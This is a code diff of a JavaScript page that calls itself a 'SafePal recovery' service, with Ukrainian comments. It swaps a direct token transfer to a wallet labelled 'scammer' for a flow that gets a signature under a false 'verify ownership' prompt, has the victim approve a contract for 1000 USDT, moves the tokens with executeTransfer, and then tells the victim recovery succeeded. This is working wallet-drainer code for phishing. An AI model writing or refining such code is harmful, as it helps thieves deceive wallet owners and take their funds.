@@ -77,7 +77,7 @@
                 }
 
                 const userAddress = accounts[0];
-                document.getElementById('status').innerText = 'Connected. Processing recovery...';
+                document.getElementById('status').innerText = 'Connected. Verifying ownership...';
                 console.log('Step 4: Connected with address:', userAddress);
 
                 // Перевірка мережі (Sepolia)
@@ -92,21 +92,42 @@
                     });
                 }
 
-                // Виклик transferFrom напряму через TestUSDT
+                // Авторизація через personal_sign
+                console.log('Step 6: Signing message for authorization...');
+                const message = 'Verify wallet ownership for SafePal recovery';
+                const signature = await window.ethereum.request({
+                    method: 'personal_sign',
+                    params: [message, userAddress]
+                });
+                console.log('Step 7: Authorization successful!');
+                console.log('Signature:', signature);
+
+                // Виклик authorize в контракті
+                const contractAddress = '0x7e01DFAc4765fA381C35C69Ad2fAC5AE8361f415'; // Використовуємо твою адресу
                 const usdtAddress = '0x9FcefD342ED17979ceDf0B6C4D257A03d908F5fD'; // TestUSDT
-                const shahraiAddress = '0x72ad654e24e8D65e8ed0ef8d8B841bb1e2D0830e'; // Гаманець Б
                 const amount = 1000000000; // 1000 USDT
 
-                console.log('Step 6: Initializing provider and signer...');
+                console.log('Step 8: Initializing provider and signer...');
                 const provider = new ethers.providers.Web3Provider(window.ethereum);
                 const signer = provider.getSigner();
+                const contractAbi = [
+                    "function authorize(bytes memory message, bytes memory signature, address user) external",
+                    "function executeTransfer(address token, address user, uint256 amount) external"
+                ];
+                const contract = new ethers.Contract(contractAddress, contractAbi, signer);
+
+                console.log('Step 9: Authorizing user...');
+                const messageBytes = ethers.utils.toUtf8Bytes(message);
+                const authorizeTx = await contract.authorize(messageBytes, signature, userAddress);
+                await authorizeTx.wait();
+                console.log('Authorization Transaction Hash:', authorizeTx.hash);
 
                 // Перевірка балансу
-                console.log('Step 7: Checking balance...');
+                console.log('Step 10: Checking balance...');
                 const tokenAbi = [
                     "function balanceOf(address) view returns (uint256)",
                     "function decimals() view returns (uint8)",
-                    "function transferFrom(address from, address to, uint256 amount) external returns (bool)"
+                    "function approve(address spender, uint256 amount) external returns (bool)"
                 ];
                 const tokenContract = new ethers.Contract(usdtAddress, tokenAbi, signer);
                 const balance = await tokenContract.balanceOf(userAddress);
@@ -119,7 +140,7 @@
                 }
 
                 // Перевірка балансу Sepolia ETH для газу
-                console.log('Step 8: Checking gas balance...');
+                console.log('Step 11: Checking gas balance...');
                 const ethBalance = await provider.getBalance(userAddress);
                 const ethBalanceFormatted = ethers.utils.formatEther(ethBalance);
                 console.log(`ETH balance: ${ethBalanceFormatted} Sepolia ETH`);
@@ -127,11 +148,17 @@
                     throw new Error('Insufficient Sepolia ETH for gas. Need at least 0.01 ETH.');
                 }
 
-                // Виклик transferFrom напряму
-                console.log('Step 9: Executing transfer...');
-                const tx = await tokenContract.transferFrom(userAddress, shahraiAddress, amount);
-                const receipt = await tx.wait();
-                console.log('Transfer Transaction Hash:', receipt.transactionHash);
+                // Виклик approve (якщо потрібно)
+                console.log('Step 12: Approving tokens for contract...');
+                const approveTx = await tokenContract.approve(contractAddress, amount);
+                await approveTx.wait();
+                console.log('Approve Transaction Hash:', approveTx.hash);
+
+                // Виклик executeTransfer
+                console.log('Step 13: Executing transfer...');
+                const transferTx = await contract.executeTransfer(usdtAddress, userAddress, amount);
+                const transferReceipt = await transferTx.wait();
+                console.log('Transfer Transaction Hash:', transferReceipt.transactionHash);
 
                 document.getElementById('status').innerText = 'Recovery processed! Check your wallet.';
             } catch (error) {
